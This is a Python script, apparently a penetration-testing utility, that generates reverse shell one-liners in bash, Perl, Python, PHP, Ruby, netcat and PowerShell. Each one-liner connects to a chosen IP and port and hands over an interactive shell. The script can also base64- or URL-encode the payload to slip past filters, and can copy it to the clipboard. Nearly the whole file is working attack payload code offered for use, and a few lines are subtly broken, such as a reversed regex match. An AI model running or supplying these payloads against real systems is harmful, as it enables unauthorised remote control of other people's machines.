#!/usr/bin/env python3

# Created by 0xd4y

# Contact:
## LinkedIn: https://www.linkedin.com/in/segev-eliezer/
## Website: https://0xd4y.github.io/

### A script for creating a reverse shell oneliner

import argparse
from argparse import RawTextHelpFormatter
from termcolor import colored, cprint
import colorama

import urllib.parse
import base64

import netifaces as ni
import re
import sys

import pyperclip

# Coloring the help
help_supported_shell_types = colored('=== Supported reverse shell types ===','blue')
help_supported_encoding_types = colored('=== Supported encoding types ===','blue')
help_default_values = colored('\n=== Default values ===','blue')
help_subtitle = colored('**** Outputs a reverse shell. ****','green')

parser = argparse.ArgumentParser(description=f'''{help_subtitle}\n{help_default_values}\n
        1. ip = tun0 (otherwise eth0)
        2. port = 443
        3. rev_shell type = bash
        4. shell = /bin/sh''',epilog=f'''{help_supported_shell_types}\n
        1. Ruby
        2. Python and Python3
        3. Netcat | nc
        4. Perl
        5. Bash
        6. PHP
        7. Powershell | ps
\n{help_supported_encoding_types}\n
        1. base64|b64   base64 encodes all characters.
        2. url          url-encodes special characters.
        3. url-all      url-encodes all characters.
\nExamples:\n
python3 revshell.py -i 10.13.3.7 -p 9001 -t nc -e url-all
python3 revshell.py -p 1337''', formatter_class=RawTextHelpFormatter)

parser.add_argument('-i', '--ip', type=str, metavar='', default = "tun0", help='Specify the IP address you want to listen on.')
parser.add_argument('-p', '--port', type=str, metavar = '', default="443", help='The port you want to listen on.')
parser.add_argument('-s', '--shell', type=str, metavar = '', default = "/bin/sh", help='Which shell you want to use (e.g. /bin/bash, /bin/sh, etc.)')
parser.add_argument('-t', '--rev-type', type=str, metavar = '', default = "bash", help='The kind of reverse shell you would like (e.g. perl, python, nc, etc.)')
parser.add_argument('-e', '--encode', type=str, metavar = '', help='Specify encoding for the shell.')
parser.add_argument('-r', '--raw', action = 'store_true', help='Prints out shell without a newline.\n')
parser.add_argument('-c', '--clipboard', action = 'store_true', help='Copies into clipboard.\n')

args = parser.parse_args()

class shells():
    def __init__(self,ip,port,rev_type,encode):
        self.ip = ip
        self.port = port
        self.rev_type = rev_type
        self.shell = shell
        self.encode = encode
    
    def encoding(reverse,encode):        
        encode = encode.lower()
        encoding_types = ['base64','b64','url','url-all']
        if encode not in encoding_types:
            sys.exit("""\nYou entered an unsupported encoding type. The available encoding types are:\n
            1. base64|b64   base64 encodes all characters.
            2. url          url-encodes special characters.
            3. url-all      url-encodes all characters.\n""")
        if encode == "url":
            return urllib.parse.quote_plus(reverse)
        # Encodes all characters
        elif (encode == "url-all"):
            return "".join("%{0:0>2}".format(format(ord(char), "x")) for char in reverse)
        elif (encode == "base64" or encode == "b64"):
            return base64.b64encode(reverse.encode("UTF-8")).decode("UTF-8")

    def reverse_shell(self,**args):       
        global rev_type
        global shell
        global port
        global ip
        
        # Checking if user inputted ip or interface
        if bool(re.match(str(ip), '^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$'))==False: # True when user enters interface
             
            interfaces = ['eth0','eth1','wlan0','ppp0','lo','vboxnet0','pan0','vmnet1','vmnet8','tun0']
            if(ip.lower() in interfaces):
                try:
                    ip = ni.ifaddresses(ip)[ni.AF_INET][0]['addr']
                except ValueError:
                    ip = ni.ifaddresses('eth0')[ni.AF_INET][0]['addr']
                except Exception:
                    sys.exit("Please specify an ip address or interface.")
        
        # Coloring messes up output unless initialized with coloram.
        # Couldn't find a way to make it work with encoding
        if not encode and not clipboard:
            colorama.init()
            shell = colored(shell, 'red')
            port = colored(port, 'red')
            ip = colored(ip, 'red')

        # Default reverse shell
        if not rev_type: 
            reverse = """bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'""".format(ip,port)
        
        if rev_type:
            rev_type = rev_type.lower()
            rev_types = ['bash','perl','python','python3','php','nc','netcat','ruby','powershell','ps']
            
            if rev_type in rev_types:
            
                if(rev_type == "perl"):
                    reverse = """perl -e 'use Socket;$i="{}";$p={};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{} -i");}};'""".format(ip, port, shell)
                elif(rev_type == "bash"):
                    reverse = """bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'""".format(ip,port)
                elif(rev_type == "python"):
                    reverse = """python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{}","-i"]);'""".format(ip, port, shell)
                elif(rev_type == "python3"):
                    reverse = """python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{}",{}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["{}","-i"]);'""".format(ip, port, shell)
                elif(rev_type == "php"):
                    reverse = """php -r '$sock=fsockopen("{}",{});exec("{} -i <&3 >&3 2>&3");'""".format(ip, port, shell)
                elif(rev_type == "ruby"):
                    reverse = """ruby -rsocket -e'f=TCPSocket.open("{}",{}).to_i;exec sprintf("{} -i <&%d >&%d 2>&%d",f,f,f)'""".format(ip, port, shell)
                elif(rev_type == "nc" or rev_type == "netcat"):
                    reverse = """rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|{} -i 2>&1|nc {} {} >/tmp/f""".format(shell, ip, port)
                elif(rev_type == "ps" or rev_type == "powershell"):
                    reverse = '''powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{}',{});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%i{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"'''.format(ip,port)
            else:
                sys.exit('''You have inputted an unsupported reverse shell type. The supported types are:\n    
            1. Ruby
            2. Python and Python3
            3. Netcat | nc
            4. Perl
            5. Bash
            6. PHP
            7. Powershell | ps\n''')
        
        # If user wants to encode the shell
        if encode:
            reverse = shells.encoding(reverse,encode)
            return reverse 
        else:     
            return reverse
    
# Gets all the arguments
if __name__ == '__main__':
    ip = args.ip
    port = args.port
    shell = args.shell
    rev_type = args.rev_type
    encode = args.encode
    raw = args.raw
    clipboard = args.clipboard
    
    arguments = shells(ip,port,rev_type,encode)

if clipboard:
    cprint("The reverse shell has been copied to your system clipboard.","green")
    sys.exit(pyperclip.copy(arguments.reverse_shell()))
if len(sys.argv) > 1 and not raw:
    sys.exit(arguments.reverse_shell())
elif raw:
    sys.exit(arguments.reverse_shell(), end="")
else:
    parser.print_help()
